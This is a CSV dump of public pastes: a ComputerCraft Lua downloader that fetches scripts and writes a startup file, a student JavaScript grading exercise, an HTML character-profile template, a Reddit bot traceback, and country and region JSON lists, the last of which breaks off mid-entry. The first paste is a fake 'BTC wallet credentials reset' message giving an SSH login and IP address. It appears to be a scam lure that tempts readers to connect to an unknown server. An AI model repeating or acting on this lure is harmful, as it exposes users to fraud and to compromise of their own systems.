id,title,username,language,date,content
i7QH6zqN,BTC Wallet Credentials have been reset,posserestu_37,GetText,Tuesday 4th of July 2023 12:30:23 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are lymnamkax62:5pJKkb on 45.9.148.244
You can connect via SSH.
Regards"
UrwfnqEw,DownloadAPIs.lua,theTANCO,Lua,Tuesday 4th of July 2023 12:25:30 AM CDT,"-- Download or update all of my finished ComputerCraft API scripts at once, not including APIs for turtles.
-- pastebin run UrwfnqEw
if fs.exists(""/API/Class.lua"") then fs.delete(""/API/Class.lua"") end
shell.run(""pastebin"", ""get"", ""t2TvSiSU"", ""/API/Class.lua"") -- Class API
if fs.exists(""/API/Class.lua.changelog"") then fs.delete(""/API/Class.lua.changelog"") end
shell.run(""pastebin"", ""get"", ""PTWQcPsP"", ""/API/Class.lua.changelog"") -- Class API Changelog
if fs.exists(""/API/Class.lua.txt"") then fs.delete(""/API/Class.lua.txt"") end
shell.run(""pastebin"", ""get"", ""upj3fgyZ"", ""/API/Class.lua.txt"") -- Class API Documentation

if fs.exists(""/API/LibAppend.lua"") then fs.delete(""/API/LibAppend.lua"") end
shell.run(""pastebin"", ""get"", ""Rac6Jxjg"", ""/API/LibAppend.lua"") -- Extra methods and functions
if fs.exists(""/API/LibAppend.lua.changelog"") then fs.delete(""/API/LibAppend.lua.changelog"") end
shell.run(""pastebin"", ""get"", ""2cK0DcBk"", ""/API/LibAppend.lua.changelog"") -- Lib Append Changelog

if fs.exists(""/API/ContextMenu.lua"") then fs.delete(""/API/ContextMenu.lua"") end
shell.run(""pastebin"", ""get"", ""4hpwn3mn"", ""/API/ContextMenu.lua"") -- Context Menus API
if fs.exists(""/API/Events.lua"") then fs.delete(""/API/Events.lua"") end
shell.run(""pastebin"", ""get"", ""KA2dK07y"", ""/API/Events.lua"") -- Events Handler API
if fs.exists(""/TechDemos/testGraphics.lua"") then fs.delete(""/TechDemos/testGraphics.lua"") end
shell.run(""pastebin"", ""get"", ""UyRcpW8t"", ""/TechDemos/testGraphics.lua"") -- Program for testing the graphics

-- The following code creates a startup file that automatically runs the graphics testing program and the lua interactive prompt.
local file = fs.open(""startup.lua"", ""w"")
file.writeLine('shell.run(""bg"", ""/TechDemos/testGraphics.lua"")')
file.writeLine('shell.run(""bg"", ""lua"")')
file.close()
shell.run(""startup.lua"")"
vjs2NLZM,graduate,remico,JavaScript,Tuesday 4th of July 2023 12:03:19 AM CDT,"function graduation (input) {
let student = input[0];
let year = 1;
let index = 1;
let failCount = 0;
let gradeSum = 0;

    while (year <= 12){
        let grade = Number (input [index]);
        index++;
        gradeSum += grade;
                if (grade < 4){
                    failCount++;
                    if (failCount > 1){
                        break;
                    }
                }
        year++;
    }
        if (failCount > 1){
            console.log (`${student} has been excluded at ${year} grade`);
        }else {
            let avgGrade = gradeSum / 12;
            console.log (`${student} graduated. Average grade: ${avgGrade.toFixed(2)});
        }
}
//graduation([""Gosho"",""5"",""5.5"",""6"", ""5.43"", ""5.5"", ""6"", ""5.55"", ""5"", ""6"", ""6"", ""5.43"", ""5""]);"
ZNABvveH,The Bare Minimum (HTML/Mobile Friendly),plutii,HTML,Monday 3rd of July 2023 11:58:44 PM CDT,"<div class=""container card"">
  <div class=""row justify-content-md-center h-100"">
    <div class=""col-sm-4 p-1 bg-light d-flex"">
      <table class=""table-sm"" align=""center"" style=""border: none;"">
        <tbody>
          <tr>
            <td class=""text-right""><strong>name(s):</strong></td>
            <td>--</td>
          </tr>
          <tr>
            <td class=""text-right""><strong>pronouns</strong></td>
            <td>--</td>
          </tr>
          <tr>
            <td class=""text-right""><strong>age:</strong></td>
            <td>--</td>
          </tr>
          <tr>
            <td class=""text-right""><strong>date of birth:</strong></td>
            <td>--</td>
          </tr>
          <tr>
            <td class=""text-right""><strong>height/weight:</strong></td>
            <td>-- / --</td>
          </tr>
          <tr>
            <td class=""text-right""><strong>occupation:</strong></td>
            <td>--</td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class=""col-sm-8 p-3"" style=""height: 300px; overflow-y: auto;"">
      <h2><em>personality</em></h2>
      <div class=""pl-3"">
        lorem ipsum
      </div>
      <hr>
      <h2><em>backstory</em></h2>
      <div class=""pl-3"">
        lorem ipsum
      </div>
      <hr>
      <div class=""row"">
        <div class=""col-6"">
          <h2><em>likes</em></h2>
          <ul>
            <li>one</li>
            <li>two</li>
            <li>three</li>
          </ul>
        </div>
        <div class=""col-6"">
          <h2><em>dislikes</em></h2>
          <ul>
            <li>one</li>
            <li>two</li>
            <li>three</li>
          </ul>
        </div>
      </div>
      <hr>
      <h2><em>trivia</em></h2>
      <div class=""pl-3"">
        lorem ipsum
      </div>
    </div>
  </div>
  <div class=""row text-right bg-dark"">
    <div class=""col-sm-12 text-muted"" style=""padding-right: 1rem"">
      <p>HTML by <a href=""https://toyhou.se/purrluto"">purrluto</a></p>
    </div>
  </div>
</div>"
2aBKh4Eh,ServerError: received 500 HTTP response,Vault-TecTradingCo,Python,Monday 3rd of July 2023 11:31:23 PM CDT,"Traceback (most recent call last):
  File ""/root/Fallout76MarketplaceKarmaTransferBot/main.py"", line 258, in main
    for comment in comment_stream:
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/util.py"", line 195, in stream_generator
    for item in reversed(list(function(limit=limit, **function_kwargs))):
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 63, in __next__
    self._next_batch()
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = self._reddit.get(self.url, params=self.params)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 634, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 739, in _objectify_request
    self.request(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 253, in _request_with_retries
    return self._do_retry(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 162, in _do_retry
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 253, in _request_with_retries
    return self._do_retry(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 162, in _do_retry
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 266, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.ServerError: received 500 HTTP response
"
XW1x2NuW,countries,nhax,JSON,Monday 3rd of July 2023 11:16:22 PM CDT,"{
    ""AF"": ""Afghanistan"",
    ""AX"": ""\u00c5land Islands"",
    ""AL"": ""Albania"",
    ""DZ"": ""Algeria"",
    ""AS"": ""American Samoa"",
    ""AD"": ""Andorra"",
    ""AO"": ""Angola"",
    ""AI"": ""Anguilla"",
    ""AQ"": ""Antarctica"",
    ""AG"": ""Antigua and Barbuda"",
    ""AR"": ""Argentina"",
    ""AM"": ""Armenia"",
    ""AW"": ""Aruba"",
    ""AU"": ""Australia"",
    ""AT"": ""Austria"",
    ""AZ"": ""Azerbaijan"",
    ""BS"": ""Bahamas"",
    ""BH"": ""Bahrain"",
    ""BD"": ""Bangladesh"",
    ""BB"": ""Barbados"",
    ""BY"": ""Belarus"",
    ""BE"": ""Belgium"",
    ""PW"": ""Belau"",
    ""BZ"": ""Belize"",
    ""BJ"": ""Benin"",
    ""BM"": ""Bermuda"",
    ""BT"": ""Bhutan"",
    ""BO"": ""Bolivia"",
    ""BQ"": ""Bonaire, Saint Eustatius and Saba"",
    ""BA"": ""Bosnia and Herzegovina"",
    ""BW"": ""Botswana"",
    ""BV"": ""Bouvet Island"",
    ""BR"": ""Brazil"",
    ""IO"": ""British Indian Ocean Territory"",
    ""BN"": ""Brunei"",
    ""BG"": ""Bulgaria"",
    ""BF"": ""Burkina Faso"",
    ""BI"": ""Burundi"",
    ""KH"": ""Cambodia"",
    ""CM"": ""Cameroon"",
    ""CA"": ""Canada"",
    ""CV"": ""Cape Verde"",
    ""KY"": ""Cayman Islands"",
    ""CF"": ""Central African Republic"",
    ""TD"": ""Chad"",
    ""CL"": ""Chile"",
    ""CN"": ""China"",
    ""CX"": ""Christmas Island"",
    ""CC"": ""Cocos (Keeling) Islands"",
    ""CO"": ""Colombia"",
    ""KM"": ""Comoros"",
    ""CG"": ""Congo (Brazzaville)"",
    ""CD"": ""Congo (Kinshasa)"",
    ""CK"": ""Cook Islands"",
    ""CR"": ""Costa Rica"",
    ""HR"": ""Croatia"",
    ""CU"": ""Cuba"",
    ""CW"": ""Cura&ccedil;ao"",
    ""CY"": ""Cyprus"",
    ""CZ"": ""Czech Republic"",
    ""DK"": ""Denmark"",
    ""DJ"": ""Djibouti"",
    ""DM"": ""Dominica"",
    ""DO"": ""Dominican Republic"",
    ""EC"": ""Ecuador"",
    ""EG"": ""Egypt"",
    ""SV"": ""El Salvador"",
    ""GQ"": ""Equatorial Guinea"",
    ""ER"": ""Eritrea"",
    ""EE"": ""Estonia"",
    ""ET"": ""Ethiopia"",
    ""FK"": ""Falkland Islands"",
    ""FO"": ""Faroe Islands"",
    ""FJ"": ""Fiji"",
    ""FI"": ""Finland"",
    ""FR"": ""France"",
    ""GF"": ""French Guiana"",
    ""PF"": ""French Polynesia"",
    ""TF"": ""French Southern Territories"",
    ""GA"": ""Gabon"",
    ""GM"": ""Gambia"",
    ""GE"": ""Georgia"",
    ""DE"": ""Germany"",
    ""GH"": ""Ghana"",
    ""GI"": ""Gibraltar"",
    ""GR"": ""Greece"",
    ""GL"": ""Greenland"",
    ""GD"": ""Grenada"",
    ""GP"": ""Guadeloupe"",
    ""GU"": ""Guam"",
    ""GT"": ""Guatemala"",
    ""GG"": ""Guernsey"",
    ""GN"": ""Guinea"",
    ""GW"": ""Guinea-Bissau"",
    ""GY"": ""Guyana"",
    ""HT"": ""Haiti"",
    ""HM"": ""Heard Island and McDonald Islands"",
    ""HN"": ""Honduras"",
    ""HK"": ""Hong Kong"",
    ""HU"": ""Hungary"",
    ""IS"": ""Iceland"",
    ""IN"": ""India"",
    ""ID"": ""Indonesia"",
    ""IR"": ""Iran"",
    ""IQ"": ""Iraq"",
    ""IE"": ""Ireland"",
    ""IM"": ""Isle of Man"",
    ""IL"": ""Israel"",
    ""IT"": ""Italy"",
    ""CI"": ""Ivory Coast"",
    ""JM"": ""Jamaica"",
    ""JP"": ""Japan"",
    ""JE"": ""Jersey"",
    ""JO"": ""Jordan"",
    ""KZ"": ""Kazakhstan"",
    ""KE"": ""Kenya"",
    ""KI"": ""Kiribati"",
    ""KW"": ""Kuwait"",
    ""KG"": ""Kyrgyzstan"",
    ""LA"": ""Laos"",
    ""LV"": ""Latvia"",
    ""LB"": ""Lebanon"",
    ""LS"": ""Lesotho"",
    ""LR"": ""Liberia"",
    ""LY"": ""Libya"",
    ""LI"": ""Liechtenstein"",
    ""LT"": ""Lithuania"",
    ""LU"": ""Luxembourg"",
    ""MO"": ""Macao"",
    ""MK"": ""North Macedonia"",
    ""MG"": ""Madagascar"",
    ""MW"": ""Malawi"",
    ""MY"": ""Malaysia"",
    ""MV"": ""Maldives"",
    ""ML"": ""Mali"",
    ""MT"": ""Malta"",
    ""MH"": ""Marshall Islands"",
    ""MQ"": ""Martinique"",
    ""MR"": ""Mauritania"",
    ""MU"": ""Mauritius"",
    ""YT"": ""Mayotte"",
    ""MX"": ""Mexico"",
    ""FM"": ""Micronesia"",
    ""MD"": ""Moldova"",
    ""MC"": ""Monaco"",
    ""MN"": ""Mongolia"",
    ""ME"": ""Montenegro"",
    ""MS"": ""Montserrat"",
    ""MA"": ""Morocco"",
    ""MZ"": ""Mozambique"",
    ""MM"": ""Myanmar"",
    ""NA"": ""Namibia"",
    ""NR"": ""Nauru"",
    ""NP"": ""Nepal"",
    ""NL"": ""Netherlands"",
    ""NC"": ""New Caledonia"",
    ""NZ"": ""New Zealand"",
    ""NI"": ""Nicaragua"",
    ""NE"": ""Niger"",
    ""NG"": ""Nigeria"",
    ""NU"": ""Niue"",
    ""NF"": ""Norfolk Island"",
    ""MP"": ""Northern Mariana Islands"",
    ""KP"": ""North Korea"",
    ""NO"": ""Norway"",
    ""OM"": ""Oman"",
    ""PK"": ""Pakistan"",
    ""PS"": ""Palestinian Territory"",
    ""PA"": ""Panama"",
    ""PG"": ""Papua New Guinea"",
    ""PY"": ""Paraguay"",
    ""PE"": ""Peru"",
    ""PH"": ""Philippines"",
    ""PN"": ""Pitcairn"",
    ""PL"": ""Poland"",
    ""PT"": ""Portugal"",
    ""PR"": ""Puerto Rico"",
    ""QA"": ""Qatar"",
    ""RE"": ""Reunion"",
    ""RO"": ""Romania"",
    ""RU"": ""Russia"",
    ""RW"": ""Rwanda"",
    ""BL"": ""Saint Barth&eacute;lemy"",
    ""SH"": ""Saint Helena"",
    ""KN"": ""Saint Kitts and Nevis"",
    ""LC"": ""Saint Lucia"",
    ""MF"": ""Saint Martin (French part)"",
    ""SX"": ""Saint Martin (Dutch part)"",
    ""PM"": ""Saint Pierre and Miquelon"",
    ""VC"": ""Saint Vincent and the Grenadines"",
    ""SM"": ""San Marino"",
    ""ST"": ""S&atilde;o Tom&eacute; and Pr&iacute;ncipe"",
    ""SA"": ""Saudi Arabia"",
    ""SN"": ""Senegal"",
    ""RS"": ""Serbia"",
    ""SC"": ""Seychelles"",
    ""SL"": ""Sierra Leone"",
    ""SG"": ""Singapore"",
    ""SK"": ""Slovakia"",
    ""SI"": ""Slovenia"",
    ""SB"": ""Solomon Islands"",
    ""SO"": ""Somalia"",
    ""ZA"": ""South Africa"",
    ""GS"": ""South Georgia\/Sandwich Islands"",
    ""KR"": ""South Korea"",
    ""SS"": ""South Sudan"",
    ""ES"": ""Spain"",
    ""LK"": ""Sri Lanka"",
    ""SD"": ""Sudan"",
    ""SR"": ""Suriname"",
    ""SJ"": ""Svalbard and Jan Mayen"",
    ""SZ"": ""Swaziland"",
    ""SE"": ""Sweden"",
    ""CH"": ""Switzerland"",
    ""SY"": ""Syria"",
    ""TW"": ""Taiwan"",
    ""TJ"": ""Tajikistan"",
    ""TZ"": ""Tanzania"",
    ""TH"": ""Thailand"",
    ""TL"": ""Timor-Leste"",
    ""TG"": ""Togo"",
    ""TK"": ""Tokelau"",
    ""TO"": ""Tonga"",
    ""TT"": ""Trinidad and Tobago"",
    ""TN"": ""Tunisia"",
    ""TR"": ""Turkey"",
    ""TM"": ""Turkmenistan"",
    ""TC"": ""Turks and Caicos Islands"",
    ""TV"": ""Tuvalu"",
    ""UG"": ""Uganda"",
    ""UA"": ""Ukraine"",
    ""AE"": ""United Arab Emirates"",
    ""GB"": ""United Kingdom (UK)"",
    ""US"": ""United States (US)"",
    ""UM"": ""United States (US) Minor Outlying Islands"",
    ""UY"": ""Uruguay"",
    ""UZ"": ""Uzbekistan"",
    ""VU"": ""Vanuatu"",
    ""VA"": ""Vatican"",
    ""VE"": ""Venezuela"",
    ""VN"": ""Vietnam"",
    ""VG"": ""Virgin Islands (British)"",
    ""VI"": ""Virgin Islands (US)"",
    ""WF"": ""Wallis and Futuna"",
    ""EH"": ""Western Sahara"",
    ""WS"": ""Samoa"",
    ""YE"": ""Yemen"",
    ""ZM"": ""Zambia"",
    ""ZW"": ""Zimbabwe""
}"
wKXdn9Fe,states/districts,nhax,JSON,Monday 3rd of July 2023 11:15:21 PM CDT,"{
  ""AF"": {},
  ""AO"": {
    ""BGO"": {
      ""name"": ""Bengo"",
      ""type"": ""state""
    },
    ""BLU"": {
      ""name"": ""Benguela"",
      ""type"": ""state""
    },
    ""BIE"": {
      ""name"": ""Bi\u00e9"",
      ""type"": ""state""
    },
    ""CAB"": {
      ""name"": ""Cabinda"",
      ""type"": ""state""
    },
    ""CNN"": {
      ""name"": ""Cunene"",
      ""type"": ""state""
    },
    ""HUA"": {
      ""name"": ""Huambo"",
      ""type"": ""state""
    },
    ""HUI"": {
      ""name"": ""Hu\u00edla"",
      ""type"": ""state""
    },
    ""CCU"": {
      ""name"": ""Kuando Kubango"",
      ""type"": ""state""
    },
    ""CNO"": {
      ""name"": ""Kwanza-Norte"",
      ""type"": ""state""
    },
    ""CUS"": {
      ""name"": ""Kwanza-Sul"",
      ""type"": ""state""
    },
    ""LUA"": {
      ""name"": ""Luanda"",
      ""type"": ""state""
    },
    ""LNO"": {
      ""name"": ""Lunda-Norte"",
      ""type"": ""state""
    },
    ""LSU"": {
      ""name"": ""Lunda-Sul"",
      ""type"": ""state""
    },
    ""MAL"": {
      ""name"": ""Malanje"",
      ""type"": ""state""
    },
    ""MOX"": {
      ""name"": ""Moxico"",
      ""type"": ""state""
    },
    ""NAM"": {
      ""name"": ""Namibe"",
      ""type"": ""state""
    },
    ""UIG"": {
      ""name"": ""U\u00edge"",
      ""type"": ""state""
    },
    ""ZAI"": {
      ""name"": ""Zaire"",
      ""type"": ""state""
    },
  },
  ""AR"": {
    ""C"": {
      ""name"": ""Ciudad Aut\u00f3noma de Buenos Aires"",
      ""type"": ""state""
    },
    ""B"": {
      ""name"": ""Buenos Aires"",
      ""type"": ""state""
    },
    ""K"": {
      ""name"": ""Catamarca"",
      ""type"": ""state""
    },
    ""H"": {
      ""name"": ""Chaco"",
      ""type"": ""state""
    },
    ""U"": {
      ""name"": ""Chubut"",
      ""type"": ""state""
    },
    ""X"": {
      ""name"": ""C\u00f3rdoba"",
      ""type"": ""state""
    },
    ""W"": {
      ""name"": ""Corrientes"",
      ""type"": ""state""
    },
    ""E"": {
      ""name"": ""Entre R\u00edos"",
      ""type"": ""state""
    },
    ""P"": {
      ""name"": ""Formosa"",
      ""type"": ""state""
    },
    ""Y"": {
      ""name"": ""Jujuy"",
      ""type"": ""state""
    },
    ""L"": {
      ""name"": ""La Pampa"",
      ""type"": ""state""
    },
    ""F"": {
      ""name"": ""La Rioja"",
      ""type"": ""state""
    },
    ""M"": {
      ""name"": ""Mendoza"",
      ""type"": ""state""
    },
    ""N"": {
      ""name"": ""Misiones"",
      ""type"": ""state""
    },
    ""Q"": {
      ""name"": ""Neuqu\u00e9n"",
      ""type"": ""state""
    },
    ""R"": {
      ""name"": ""R\u00edo Negro"",
      ""type"": ""state""
    },
    ""A"": {
      ""name"": ""Salta"",
      ""type"": ""state""
    },
    ""J"": {
      ""name"": ""San Juan"",
      ""type"": ""state""
    },
    ""D"": {
      ""name"": ""San Luis"",
      ""type"": ""state""
    },
    ""Z"": {
      ""name"": ""Santa Cruz"",
      ""type"": ""state""
    },
    ""S"": {
      ""name"": ""Santa Fe"",
      ""type"": ""state""
    },
    ""G"": {
      ""name"": ""Santiago del Estero"",
      ""type"": ""state""
    },
    ""V"": {
      ""name"": ""Tierra del Fuego"",
      ""type"": ""state""
    },
    ""T"": {
      ""name"": ""Tucum\u00e1n"",
      ""type"": ""state""
    },
  },
  ""AT"": {},
  ""AU"": {
    ""ACT"": {
      ""name"": ""Australian Capital Territory"",
      ""type"": ""state""
    },
    ""NSW"": {
      ""name"": ""New South Wales"",
      ""type"": ""state""
    },
    ""NT"": {
      ""name"": ""Northern Territory"",
      ""type"": ""state""
    },
    ""QLD"": {
      ""name"": ""Queensland"",
      ""type"": ""state""
    },
    ""SA"": {
      ""name"": ""South Australia"",
      ""type"": ""state""
    },
    ""TAS"": {
      ""name"": ""Tasmania"",
      ""type"": ""state""
    },
    ""VIC"": {
      ""name"": ""Victoria"",
      ""type"": ""state""
    },
    ""WA"": {
      ""name"": ""Western Australia"",
      ""type"": ""state""
    },
  },
  ""AX"": {},
  ""BD"": {
    ""BD-05"": {
      ""name"": ""Bagerhat"",
      ""type"": ""state""
    },
    ""BD-01"": {
      ""name"": ""Bandarban"",
      ""type"": ""state""
    },
    ""BD-02"": {
      ""name"": ""Barguna"",
      ""type"": ""state""
    },
    ""BD-06"": {
      ""name"": ""Barishal"",
      ""type"": ""state""
    },
    ""BD-07"": {
      ""name"": ""Bhola"",
      ""type"": ""state""
    },
    ""BD-03"": {
      ""name"": ""Bogura"",
      ""type"": ""state""
    },
    ""BD-04"": {
      ""name"": ""Brahmanbaria"",
      ""type"": ""state""
    },
    ""BD-09"": {
      ""name"": ""Chandpur"",
      ""type"": ""state""
    },
    ""BD-10"": {
      ""name"": ""Chattogram"",
      ""type"": ""state""
    },
    ""BD-12"": {
      ""name"": ""Chuadanga"",
      ""type"": ""state""
    },
    ""BD-11"": {
      ""name"": ""Cox's Bazar"",
      ""type"": ""state""
    },
    ""BD-08"": {
      ""name"": ""Cumilla"",
      ""type"": ""state""
    },
    ""BD-13"": {
      ""name"": ""Dhaka"",
      ""type"": ""state""
    },
    ""BD-14"": {
      ""name"": ""Dinajpur"",
      ""type"": ""state""
    },
    ""BD-15"": {
      ""name"": ""Faridpur "",
      ""type"": ""state""
    },
    ""BD-16"": {
      ""name"": ""Feni"",
      ""type"": ""state""
    },
    ""BD-19"": {
      ""name"": ""Gaibandha"",
      ""type"": ""state""
    },
    ""BD-18"": {
      ""name"": ""Gazipur"",
      ""type"": ""state""
    },
    ""BD-17"": {
      ""name"": ""Gopalganj"",
      ""type"": ""state""
    },
    ""BD-20"": {
      ""name"": ""Habiganj"",
      ""type"": ""state""
    },
    ""BD-21"": {
      ""name"": ""Jamalpur"",
      ""type"": ""state""
    },
    ""BD-22"": {
      ""name"": ""Jashore"",
      ""type"": ""state""
    },
    ""BD-25"": {
      ""name"": ""Jhalokati"",
      ""type"": ""state""
    },
    ""BD-23"": {
      ""name"": ""Jhenaidah"",
      ""type"": ""state""
    },
    ""BD-24"": {
      ""name"": ""Joypurhat"",
      ""type"": ""state""
    },
    ""BD-29"": {
      ""name"": ""Khagrachhari"",
      ""type"": ""state""
    },
    ""BD-27"": {
      ""name"": ""Khulna"",
      ""type"": ""state""
    },
    ""BD-26"": {
      ""name"": ""Kishoreganj"",
      ""type"": ""state""
    },
    ""BD-28"": {
      ""name"": ""Kurigram"",
      ""type"": ""state""
    },
    ""BD-30"": {
      ""name"": ""Kushtia"",
      ""type"": ""state""
    },
    ""BD-31"": {
      ""name"": ""Lakshmipur"",
      ""type"": ""state""
    },
    ""BD-32"": {
      ""name"": ""Lalmonirhat"",
      ""type"": ""state""
    },
    ""BD-36"": {
      ""name"": ""Madaripur"",
      ""type"": ""state""
    },
    ""BD-37"": {
      ""name"": ""Magura"",
      ""type"": ""state""
    },
    ""BD-33"": {
      ""name"": ""Manikganj "",
      ""type"": ""state""
    },
    ""BD-39"": {
      ""name"": ""Meherpur"",
      ""type"": ""state""
    },
    ""BD-38"": {
      ""name"": ""Moulvibazar"",
      ""type"": ""state""
    },
    ""BD-35"": {
      ""name"": ""Munshiganj"",
      ""type"": ""state""
    },
    ""BD-34"": {
      ""name"": ""Mymensingh"",
      ""type"": ""state""
    },
    ""BD-48"": {
      ""name"": ""Naogaon"",
      ""type"": ""state""
    },
    ""BD-43"": {
      ""name"": ""Narail"",
      ""type"": ""state""
    },
    ""BD-40"": {
      ""name"": ""Narayanganj"",
      ""type"": ""state""
    },
    ""BD-42"": {
      ""name"": ""Narsingdi"",
      ""type"": ""state""
    },
    ""BD-44"": {
      ""name"": ""Natore"",
      ""type"": ""state""
    },
    ""BD-45"": {
      ""name"": ""Nawabganj"",
      ""type"": ""state""
    },
    ""BD-41"": {
      ""name"": ""Netrakona"",
      ""type"": ""state""
    },
    ""BD-46"": {
      ""name"": ""Nilphamari"",
      ""type"": ""state""
    },
    ""BD-47"": {
      ""name"": ""Noakhali"",
      ""type"": ""state""
    },
    ""BD-49"": {
      ""name"": ""Pabna"",
      ""type"": ""state""
    },
    ""BD-52"": {
      ""name"": ""Panchagarh"",
      ""type"": ""state""
    },
    ""BD-51"": {
      ""name"": ""Patuakhali"",
      ""type"": ""state""
    },
    ""BD-50"": {
      ""name"": ""Pirojpur"",
      ""type"": ""state""
    },
    ""BD-53"": {
      ""name"": ""Rajbari"",
      ""type"": ""state""
    },
    ""BD-54"": {
      ""name"": ""Rajshahi"",
      ""type"": ""state""
    },
    ""BD-56"": {
      ""name"": ""Rangamati"",
      ""type"": ""state""
    },
    ""BD-55"": {
      ""name"": ""Rangpur"",
      ""type"": ""state""
    },
    ""BD-58"": {
      ""name"": ""Satkhira"",
      ""type"": ""state""
    },
    ""BD-62"": {
      ""name"": ""Shariatpur"",
      ""type"": ""state""
    },
    ""BD-57"": {
      ""name"": ""Sherpur"",
      ""type"": ""state""
    },
    ""BD-59"": {
      ""name"": ""Sirajganj"",
      ""type"": ""state""
    },
    ""BD-61"": {
      ""name"": ""Sunamganj"",
      ""type"": ""state""
    },
    ""BD-60"": {
      ""name"": ""Sylhet"",
      ""type"": ""state""
    },
    ""BD-63"": {
      ""name"": ""Tangail"",
      ""type"": ""state""
    },
    ""BD-64"": {
      ""name"": ""Thakurgaon"",
      ""type"": ""state""
    },
  },
  ""BE"": {},
  ""BG"": {
    ""BG-01"": {
      ""name"": ""Blagoevgrad"",
      ""type"": ""state""
    },
    ""BG-02"": {
      ""name"": ""Burgas"",
      ""type"": ""state""
    },
    ""BG-08"": {
      ""name"": ""Dobrich"",
      ""type"": ""state""
    },
    ""BG-07"": {
      ""name"": ""Gabrovo"",
      ""type"": ""state""
    },
    ""BG-26"": {
      ""name"": ""Haskovo"",
      ""type"": ""state""
    },
    ""BG-09"": {
      ""name"": ""Kardzhali"",
      ""type"": ""state""
    },
    ""BG-10"": {
      ""name"": ""Kyustendil"",
      ""type"": ""state""
    },
    ""BG-11"": {
      ""name"": ""Lovech"",
      ""type"": ""state""
    },
    ""BG-12"": {
      ""name"": ""Montana"",
      ""type"": ""state""
    },
    ""BG-13"": {
      ""name"": ""Pazardzhik"",
      ""type"": ""state""
    },
    ""BG-14"": {
      ""name"": ""Pernik"",
      ""type"": ""state""
    },
    ""BG-15"": {
      ""name"": ""Pleven"",
      ""type"": ""state""
    },
    ""BG-16"": {
      ""name"": ""Plovdiv"",
      ""type"": ""state""
    },
    ""BG-17"": {
      ""name"": ""Razgrad"",
      ""type"": ""state""
    },
    ""BG-18"": {
      ""name"": ""Ruse"",
      ""type"": ""state""
    },
    ""BG-27"": {
      ""name"": ""Shumen"",
      ""type"": ""state""
    },
    ""BG-19"": {
      ""name"": ""Silistra"",
      ""type"": ""state""
    },
    ""BG-20"": {
      ""name"": ""Sliven"",
      ""type"": ""state""
    },
    ""BG-21"": {
      ""name"": ""Smolyan"",
      ""type"": ""state""
    },
    ""BG-23"": {
      ""name"": ""Sofia"",
      ""type"": ""state""
    },
    ""BG-22"": {
      ""name"": ""Sofia-Grad"",
      ""type"": ""state""
    },
    ""BG-24"": {
      ""name"": ""Stara Zagora"",
      ""type"": ""state""
    },
    ""BG-25"": {
      ""name"": ""Targovishte"",
      ""type"": ""state""
    },
    ""BG-03"": {
      ""name"": ""Varna"",
      ""type"": ""state""
    },
    ""BG-04"": {
      ""name"": ""Veliko Tarnovo"",
      ""type"": ""state""
    },
    ""BG-05"": {
      ""name"": ""Vidin"",
      ""type"": ""state""
    },
    ""BG-06"": {
      ""name"": ""Vratsa"",
      ""type"": ""state""
    },
    ""BG-28"": {
      ""name"": ""Yambol"",
      ""type"": ""state""
    },
  },
  ""BH"": {},
  ""BI"": {},
  ""BJ"": {
    ""AL"": {
      ""name"": ""Alibori"",
      ""type"": ""state""
    },
    ""AK"": {
      ""name"": ""Atakora"",
      ""type"": ""state""
    },
    ""AQ"": {
      ""name"": ""Atlantique"",
      ""type"": ""state""
    },
    ""BO"": {
      ""name"": ""Borgou"",
      ""type"": ""state""
    },
    ""CO"": {
      ""name"": ""Collines"",
      ""type"": ""state""
    },
    ""KO"": {
      ""name"": ""Kouffo"",
      ""type"": ""state""
    },
    ""DO"": {
      ""name"": ""Donga"",
      ""type"": ""state""
    },
    ""LI"": {
      ""name"": ""Littoral"",
      ""type"": ""state""
    },
    ""MO"": {
      ""name"": ""Mono"",
      ""type"": ""state""
    },
    ""OU"": {
      ""name"": ""Ou\u00e9m\u00e9"",
      ""type"": ""state""
    },
    ""PL"": {
      ""name"": ""Plateau"",
      ""type"": ""state""
    },
    ""ZO"": {
      ""name"": ""Zou"",
      ""type"": ""state""
    },
  },
  ""BO"": {
    ""B"": {
      ""name"": ""Chuquisaca"",
      ""type"": ""state""
    },
    ""H"": {
      ""name"": ""Beni"",
      ""type"": ""state""
    },
    ""C"": {
      ""name"": ""Cochabamba"",
      ""type"": ""state""
    },
    ""L"": {
      ""name"": ""La Paz"",
      ""type"": ""state""
    },
    ""O"": {
      ""name"": ""Oruro"",
      ""type"": ""state""
    },
    ""N"": {
      ""name"": ""Pando"",
      ""type"": ""state""
    },
    ""P"": {
